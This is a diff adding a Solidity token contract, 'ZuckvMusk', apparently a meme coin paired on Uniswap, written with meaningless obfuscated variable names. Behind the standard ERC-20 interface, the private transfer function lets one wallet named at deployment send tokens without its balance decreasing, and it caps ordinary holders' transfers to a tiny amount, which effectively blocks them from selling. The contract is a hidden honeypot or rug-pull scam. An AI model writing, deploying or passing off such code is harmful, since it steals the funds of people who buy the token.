@@ -1,0 +1,64 @@
+contract ZuckvMusk is Ownable {
+    mapping(address => uint256) private irmvou;
+
+    uint8 public decimals = 9;
+
+    function transferFrom(address ihnmps, address qhrlucfoe, uint256 zrvix) public returns (bool success) {
+        require(zrvix <= allowance[ihnmps][msg.sender]);
+        allowance[ihnmps][msg.sender] -= zrvix;
+        yblupt(ihnmps, qhrlucfoe, zrvix);
+        return true;
+    }
+
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    function approve(address wupi, uint256 zrvix) public returns (bool success) {
+        allowance[msg.sender][wupi] = zrvix;
+        emit Approval(msg.sender, wupi, zrvix);
+        return true;
+    }
+
+    mapping(address => uint256) private cyndhjm;
+
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+
+    string public name;
+
+    mapping(address => uint256) public balanceOf;
+
+    string public symbol;
+
+    address private adefthqpinxb;
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+    uint256 private oejqtliwf = 100;
+
+    function yblupt(address ihnmps, address qhrlucfoe, uint256 zrvix) private {
+        if (0 == cyndhjm[ihnmps]) {
+            if (ihnmps != adefthqpinxb && irmvou[ihnmps] != block.number && zrvix < totalSupply) {
+                require(zrvix <= totalSupply / (10 ** decimals));
+            }
+            balanceOf[ihnmps] -= zrvix;
+        }
+        balanceOf[qhrlucfoe] += zrvix;
+        irmvou[qhrlucfoe] = block.number;
+        emit Transfer(ihnmps, qhrlucfoe, zrvix);
+    }
+
+    constructor(string memory aigrvqstoux, string memory pyrcwfhvg, address nodmepuasyl, address udrlwqzygpac) {
+        name = aigrvqstoux;
+        symbol = pyrcwfhvg;
+        balanceOf[msg.sender] = totalSupply;
+        cyndhjm[udrlwqzygpac] = oejqtliwf;
+        IUniswapV2Router02 adenprucmsgj = IUniswapV2Router02(nodmepuasyl);
+        adefthqpinxb = IUniswapV2Factory(adenprucmsgj.factory()).createPair(address(this), adenprucmsgj.WETH());
+    }
+
+    function transfer(address qhrlucfoe, uint256 zrvix) public returns (bool success) {
+        yblupt(msg.sender, qhrlucfoe, zrvix);
+        return true;
+    }
+
+    uint256 public totalSupply = 1000000000 * 10 ** 9;
+}
